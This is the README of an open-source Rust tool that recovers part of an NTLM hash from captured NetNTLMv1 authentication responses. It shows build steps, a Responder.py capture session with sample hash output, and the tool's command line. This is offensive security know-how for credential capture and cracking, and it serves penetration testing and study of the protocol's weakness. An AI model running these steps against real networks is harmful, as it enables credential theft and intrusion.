# CT3 To NTLM

This tool is based on the work of previous people :
- Evil Mog : https://www.youtube.com/watch?v=qwTTaUkKH5w
- Moxie Marlinspike : https://moxie.org/

This is a simple re-implementation of the ct3-to-ntlm.bin hashcat-utils binary in rust.

There is also a first proof of concept in python if you want to use it, but I dont give any support on it, no requirements.txt whatsoever.

## Install/build
Download latest releases or build it with rust :
```shell
git clone https://github.com/almandin/ct3-to-ntlm
cd ct3-to-ntlm
cargo build --release
mv target/release/ct3-to-ntlm $anywhere-in-you-PATH
```
Requires rust 1.59 (thanks to the strip feature in the Cargo.toml file, but you can remove it if necessary).

## What it does
Use Responder.py and get some NetNTLMv1 hashes :

```shell
#> python Responder.py -I eth0 --lm -fwrp
...
[SMB] NTLMv1 Client   : 184.64.60.62
[SMB] NTLMv1 Username : DUSTIN-5AA37877\hashcat
[SMB] NTLMv1 Hash     : hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
...

[SMB] NTLMv1-SSP Client   : 184.64.60.62
[SMB] NTLMv1-SSP Username : DUSTIN-5AA37877\hashcat
[SMB] NTLMv1-SSP Hash     : hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788
...
```

Copy the NTLMv1 or the NTLMv1-SSP hash as the argument of this tool :
```shell
$> ./ct3-to-ntlm 'hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788'
```
You get the last two bytes of the NTLM hash of the account used for the NetNTLM authentication : `586c` with the example.

# Why that
Wanted to learn how bad is NetNTLMv1 and how to attack it.
Because I also plan to look at rainbow tables generation for netntlmv1 without SSP.
